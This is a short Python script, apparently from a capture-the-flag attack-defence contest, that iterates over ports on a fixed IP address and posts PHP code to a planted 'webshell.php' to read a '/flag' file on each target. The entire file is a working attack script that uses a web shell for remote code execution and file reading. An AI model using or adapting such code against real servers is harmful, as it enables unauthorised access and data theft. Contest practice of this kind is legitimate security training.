import requests
import sys
#cnn=requests.session()

url='http://39.100.119.37:1{}80/webshell.php'

params={"moxiaoxi":"readfile('/flag');"}

i = int(sys.argv[1])

if(i<=9):
    tmp_url=url.format('0'+str(i))
else:
    tmp_url=url.format(i)
#print(tmp_url)
res=requests.post(tmp_url,data=params)
if 'flag' in res.text:
    print(res.text)
#sleep(4)
